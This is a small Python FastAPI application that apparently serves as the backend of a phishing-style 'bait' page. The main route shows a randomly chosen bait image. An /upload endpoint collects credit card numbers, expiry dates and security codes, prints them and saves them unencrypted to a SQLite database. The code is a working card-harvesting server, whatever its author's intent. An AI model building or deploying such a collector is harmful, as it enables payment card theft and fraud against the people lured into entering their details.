from random import choice
from typing import Annotated

from fastapi import FastAPI, Request, Depends
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

from sqlmodel import SQLModel, Field, Session, create_engine, select


class CreditCard(SQLModel, table=True):
    id: int | None = Field(default=None, primary_key=True)
    card_num: str
    expiry_date: str
    cvs: int

sqlite_url = f"sqlite:///database.db"
connect_args = {"check_same_thread": False}
engine = create_engine(sqlite_url, connect_args=connect_args)

def create_db_and_tables():
    SQLModel.metadata.create_all(engine)

def lifespan(app):
    create_db_and_tables()
    yield
    # Put code in here to be run when shutting down

app = FastAPI(lifespan=lifespan)
app.mount(
    "/static",
    StaticFiles(directory="static"),
    name="static"
)

templates = Jinja2Templates(directory="templates")


@app.get("/", response_class=HTMLResponse)
async def main_page(request: Request):
    bait_to_color = {
        'bait_img.png': '#81746f',
        'way_too_large.png': '#fec97b',
        'hoarse.png': '#d2c1f0',
        'pink.png': "#f3bfd9",
    }
    bait_img, background_color = choice(list(bait_to_color.items()))
    return templates.TemplateResponse(
        request=request,
        name="index.html",
        context={
            'background_color': background_color,
            'bait_img': bait_img,
        },
    )


# No idea what any of this session business is doing...
def get_session():
    with Session(engine) as session:
        yield session
SessionDep = Annotated[Session, Depends(get_session)]


@app.post("/upload")
async def upload_details(credit_card: CreditCard, session: SessionDep):
    print(credit_card)
    # Validate Client side inputs
    CreditCard.model_validate(credit_card)
    # Write Result to Database
    session.add(credit_card)
    session.commit()
    # TODO Tell client about success maybe
    return
